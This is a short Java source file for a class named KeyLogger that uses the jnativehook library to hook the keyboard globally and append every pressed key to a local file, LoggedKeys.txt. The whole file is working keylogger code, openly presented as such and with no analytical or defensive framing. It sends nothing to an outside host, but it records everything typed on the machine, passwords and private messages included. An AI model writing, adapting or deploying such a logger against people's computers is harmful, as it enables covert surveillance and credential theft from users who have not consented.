package com.sobermind.works;

import java.io.*;
import java.nio.file.*;
import java.util.logging.Level;
import org.jnativehook.*;
import org.jnativehook.keyboard.*;
import org.slf4j.*;

/**
 * @author Davidx3d
 */
public class KeyLogger implements NativeKeyListener {

	private static final Path file = Paths.get("LoggedKeys.txt");
	private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);

	public static void main(String[] args) {

		logger.info("Key Logger Started");
		init();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			logger.error(e.getMessage(), e);
			System.exit(-1);
		}
		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
	private static void init() {
		//Get Logger For "org.jnativehook" And Set Level To Warning
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);

		//Dont Forget To Disable The Parent Handlers
		logger.setUseParentHandlers(false);
	}
	public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
			
			if (keyText.length() > 1) {
				writer.print("(" + keyText + ")");
			} else {
				writer.print(keyText);
			}
			
		} catch (IOException ex) {
			logger.error(ex.getMessage(), ex);
			System.exit(-1);
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		//Nothing Here
	}
	public void nativeKeyTyped(NativeKeyEvent e) {
		//Nothing Here
	}
}